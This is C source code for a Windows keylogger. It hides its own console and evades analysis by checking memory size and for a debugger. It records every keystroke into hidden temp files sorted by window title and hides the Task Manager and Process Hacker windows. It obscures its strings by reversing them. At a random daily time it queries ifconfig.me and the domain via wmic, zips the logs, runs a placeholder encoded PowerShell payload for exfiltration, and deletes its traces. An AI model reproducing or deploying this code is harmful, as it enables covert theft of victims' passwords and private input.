#include<windows.h>
#include<stdio.h>
#include<tchar.h>
#include<string.h>
#include <stdbool.h>
#pragma comment (lib, "kernel32.lib")
#pragma comment (lib, "User32.lib")
#pragma comment (lib, "GDI32.lib")
#pragma comment (lib, "Advapi32.lib")  

void (WINAPI * pGetSystemTime)(  LPSYSTEMTIME lpSystemTime);
BOOL (WINAPI * pGlobalMemoryStatusEx)(LPMEMORYSTATUSEX lpBuffer);
BOOL (WINAPI * pIsDebuggerPresent)();
void sendData(void);
void hide();
char *randstring(size_t length);
bool startsWith(const char *pre, const char *str);
void checkTool(char * title,HWND h);
int get_keys(void);
void replacechar(char *str, char orig, char rep);
char * getTempDir(void);
bool ram_check();
bool debug_check();
int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen);
int hour, min;
char * datapath;

int main(void)
{
   if (ram_check())
	{
            return 0;
	}
    if (debug_check())
	{
            return 0;
	}	
   
     hide();
   
   //presist();
   //printf("datapath =%s",datapath);
   datapath = getTempDir();
   strcat(datapath,randstring(10));
   CreateDirectory(datapath, NULL) ;
   SetFileAttributes(datapath,FILE_ATTRIBUTE_HIDDEN);
   SetCurrentDirectory(datapath);
   
   int t = get_keys();
   
    
   return t;
} 
void randomize()
{
	hour = (double)rand() / (RAND_MAX + 1) * 23 +1;
	min = (double)rand() / (RAND_MAX + 1) * 59 +1;
	char h[4];
	char m[4];
	sprintf(h, "%d", hour);
	sprintf(m, "%d", min);
	FILE *file;
	file=fopen(strrev("ccc.pi"),"a+");
	
	//printf("%d:%d",hour,min);
	
	fputs(h,file);
	fputc(':',file);
	fputs(m,file);
	fclose(file);
	
}
 
int get_keys(void)
{
           short character;
		   randomize();
		   char * systimef = strrev("emiTmetsySteG") ;
		   pGetSystemTime = GetProcAddress(GetModuleHandle("kernel32.dll"),systimef);
		   
             while(1)
             {
                    Sleep(10);/*to prevent 100% cpu usage*/
					
					HWND handle = GetForegroundWindow();
					FILE *file;
					char title[256];
					
					//char * fullFilePath = datapath ;

					GetWindowText(handle,title,sizeof(title));
					checkTool((char *)title,handle);
					replacechar(title,'\\','-');
					replacechar(title,'/','-');
					replacechar(title,'?','-');
					replacechar(title,':','-');
					replacechar(title,'<','-');
					replacechar(title,'>','-');
					replacechar(title,'|','-');
					replacechar(title,'*','-');
					replacechar(title,'"','-');
					//printf("\n");
					//printf(title);
					strcat(title,".ccc");
					//strcat(fullFilePath, "\\");
					//strcat(fullFilePath, title);
					//printf("\n");
					//printf(datapath);
                    
					
					SYSTEMTIME st;
					//printf("test\n%s",);
					
					pGetSystemTime(&st);
					//printf("\n%d:%d",st.wHour,st.wMinute);
					if(st.wHour == hour &&  st.wMinute == min)
					{
					  //printf("hello");	
					  sendData();
					}
					
                    for(character=8;character<=222;character++)
                    {
						
                        if(GetAsyncKeyState(character)==-32767)
                        { 
 
                            FILE *file;
							
                            file=fopen(title,"a+");
							//printf("hello");
							
                            if(file==NULL)
                            {
                                    return 1;
                            }           
                            if(file!=NULL)
                            {       
                                    if((character>=39)&&(character<=64))
                                    {
										  
                                          fputc(character,file);
                                          fclose(file);
                                          break;
                                    }       
                                    else if((character>64)&&(character<91))
                                    {
                                          character+=32;
										  
                                          fputc(character,file);
                                          fclose(file);
                                          break;
                                    }
                                    else
                                    {
                                        switch(character)
                                        {
                                              case VK_SPACE:
                                              fputc(' ',file);
                                              fclose(file);
											  								  
                                              break;   
                                              case VK_SHIFT:
                                              fputs("[SHIFT]",file);
                                              fclose(file);
                                              break;                                           
                                              case VK_RETURN:
                                              fputs("\n[ENTER]",file);
                                              fclose(file);
											  //sendData();
											  
                                              break;
                                              case VK_BACK:
                                              fputs("[BACKSPACE]",file);
                                              fclose(file);
                                              break;
                                              case VK_TAB:
                                              fputs("[TAB]",file);
                                              fclose(file);
                                              break;
                                              case VK_CONTROL:
                                              fputs("[CTRL]",file);
                                              fclose(file);
                                              break;   
                                              case VK_DELETE:
                                              fputs("[DEL]",file);
                                              fclose(file);
                                              break;
                                              case VK_OEM_1:
                                              fputs("[;:]",file);
                                              fclose(file);
                                              break;
                                              case VK_OEM_2:
                                              fputs("[/?]",file);
                                              fclose(file);
                                              break;
                                              case VK_OEM_3:
                                              fputs("[`~]",file);
                                              fclose(file);
                                              break;
                                              case VK_OEM_4:
                                              fputs("[ [{ ]",file);
                                              fclose(file);
                                              break;
                                              case VK_OEM_5:
                                              fputs("[\\|]",file);
                                              fclose(file);
                                              break;                               
                                              case VK_OEM_6:
                                              fputs("[ ]} ]",file);
                                              fclose(file);
                                              break;
                                              case VK_OEM_7:
                                              fputs("['\"]",file);
                                              fclose(file);
                                              break;                                           
                                              case VK_NUMPAD0:
                                              fputc('0',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD1:
                                              fputc('1',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD2:
                                              fputc('2',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD3:
                                              fputc('3',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD4:
                                              fputc('4',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD5:
                                              fputc('5',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD6:
                                              fputc('6',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD7:
                                              fputc('7',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD8:
                                              fputc('8',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD9:
                                              fputc('9',file);
                                              fclose(file);
                                              break;
                                              case VK_CAPITAL:
                                              fputs("[CAPS LOCK]",file);
                                              fclose(file);
                                              break;
                                              default:
                                              fclose(file);
                                              break;
                                       }       
                                  }   
                             }       
                   }   
               }                 
 
           }
           return EXIT_SUCCESS;                           
} 





char * getTempDir(void)
{
	TCHAR path[MAX_PATH];  
    TCHAR lpTempPathBuffer[MAX_PATH];
    GetTempPath(MAX_PATH, lpTempPathBuffer);
	return (char *) lpTempPathBuffer;
}	
void sendData(void)
{
	  
	  unsigned char* ps_payload = ""; // put your powrshell payload here
	  //unsigned int ps_len = sizeof(ps_payload);
	  char pscommand [] ="powershell -encodedcommand ";
      system(strrev("ccc.pi >> )(mirT.tnetnoC.)pi/em.gifnocfi tseuqeRbeW-ekovnI( llehsrewop" ));
      system(strrev("ccc.pi >> niamod teg metsysretupmoc cimw" ));
	  //printf(datapath);
	  //AESDecrypt((char *) ps_payload, ps_len, key, sizeof(key));
	  //strcat(pscommand,"powershell -encodedcommand ");
	  system("powershell \"Compress-Archive * result.zip\"");
	  strcat(pscommand,strrev(ps_payload));
	  system(pscommand);
	  //FILE *ps;
	  //ps = fopen("test.ps1","w");
      //fwrite(ps_payload,sizeof(ps_payload),1,ps); 
	  //fclose(ps);
	  system(strrev("piz.tluser led"));
	  
	  //printf(pscommand);
	  
	  system(strrev("* led"));
	  
	  //system("del test.ps1");
	  randomize();
}	

void replacechar(char *str, char orig, char rep) {
	//printf("=====%s\n",str);
    for(int i = 0; i <= strlen(str); i++)
  	{
  		if(str[i] == orig)  
		{
			//printf("%c",str[i]);
  			str[i] = rep;
 		}
		//printf("=%s\n",str);
	}
    
}
bool ram_check() {
            MEMORYSTATUSEX status;
            DWORD max = 3294496257; // 4GB
            status.dwLength = sizeof(status);
            pGlobalMemoryStatusEx = GetProcAddress(GetModuleHandle("kernel32.dll"),strrev("xEsutatSyromeMlabolG"));
            pGlobalMemoryStatusEx(&status);
            if ((DWORD)status.ullTotalPhys < max) {
                        return true;
            }
            return false;
}
bool debug_check(void) {
	pIsDebuggerPresent= GetProcAddress(GetModuleHandle("Kernel32.dll"),strrev("tneserPreggubeDsI"));
	if (pIsDebuggerPresent())
    {
       return true ;
    }
	
	       
     return false;
}

void checkTool(char * title,HWND h)
{
	//printf("\n%s",title);
	//printf("%d",strcmp(title,"Task Manager"));
	if(strcmp(title,strrev("reganaM ksaT"))==0)
	{
		//printf("here");
		ShowWindow(h,0);
	}
	if(startsWith(strrev("rekcaH ssecorP"),title))
	{
		//printf("here");
		ShowWindow(h,0);
	}
		
		
}
bool startsWith(const char *pre, const char *str)
{
    size_t lenpre = strlen(pre),
           lenstr = strlen(str);
    return lenstr < lenpre ? false : memcmp(pre, str, lenpre) == 0;
}

char *randstring(size_t length) {

    static char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";        
    char *randomString = NULL;

    if (length) {
        randomString = malloc(sizeof(char) * (length +1));

        if (randomString) {            
            for (int n = 0;n < length;n++) {            
                int key = rand() % (int)(sizeof(charset) -1);
                randomString[n] = charset[key];
            }

            randomString[length] = '\0';
        }
    }

    return randomString;
}
void hide()
{
   HWND stealth; /*creating stealth (window is not visible)*/
   AllocConsole();
   stealth=FindWindowA(strrev("ssalCwodniWelosnoC"),NULL);
   ShowWindow(stealth,0);
}